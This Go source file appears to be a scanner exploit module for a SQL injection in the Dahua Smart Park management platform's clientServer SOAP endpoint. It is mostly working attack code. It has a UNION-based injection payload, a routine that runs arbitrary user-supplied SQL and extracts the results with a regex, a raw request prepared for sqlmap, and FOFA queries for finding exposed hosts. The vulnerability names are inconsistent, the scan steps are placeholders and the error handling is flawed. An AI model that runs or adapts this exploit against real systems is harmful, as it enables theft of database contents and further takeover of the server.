package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Dahua Smart Park Comprehensive Management Platform attachment_downloadAtt.action SQL Injection Vulnerability",
    "Description": "<p>The Dahua Smart Park solution revolves around multiple business areas such as operation management, comprehensive security, convenient access, and collaborative office. It relies on AI, IoT, and big data technologies to achieve digital upgrading of park management, improve security levels, work efficiency, and reduce management costs.</p>",
    "Product": "Dahua Smart Park Comprehensive Management Platform",
    "Homepage": "https://www.dahuatech.com/cases/info/76.html",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-08-02",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/\" && (body=\"json2.js\" || body=\"gridster\")",
    "GobyQuery": "body=\"/WPMS/asset/lib/\" && (body=\"json2.js\" || body=\"gridster\")",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Follow the official patch release information, patch or upgrade to the latest version: <a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 clientServer SQL 注入漏洞",
            "Product": "大华智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua Smart Park Comprehensive Management Platform attachment_downloadAtt.action SQL Injection Vulnerability",
            "Product": "Dahua Smart Park Comprehensive Management Platform",
            "Description": "<p>The Dahua Smart Park solution revolves around multiple business areas such as operation management, comprehensive security, convenient access, and collaborative office. It relies on AI, IoT, and big data technologies to achieve digital upgrading of park management, improve security levels, work efficiency, and reduce management costs.<br></p>",
            "Recommendation": "<p>1. Follow the official patch release information, patch or upgrade to the latest version: <a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9933"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ",
			"Content-Type": "application/x-www-form-urlencoded",
		}

		rawPayload := fmt.Sprintf("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <!--type: string-->\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,(%s)-- -</arg0>\n    <!--type: long-->\n    <arg1>10</arg1>\n    </cli:getGroupInfoListByGroupId>\n    </soapenv:Body>\n  </soap:Envelope>", sql)
		urlget := "/portal/services/clientServer"
		// postData := url.QueryEscape(rawPayload)
		resp, err = setPostRequest(hostInfo, urlget, rawPayload, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/portal/services/clientServer"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "66994da114e4b229ab2290a5ff387458"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "md5(137666)"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /portal/services/clientServer HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <!--type: string-->\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,version()-- -</arg0>\n    <!--type: long-->\n    <arg1>10</arg1>\n    </cli:getGroupInfoListByGroupId>\n    </soapenv:Body>\n  </soap:Envelope>"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `"groupdetail":"(.*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
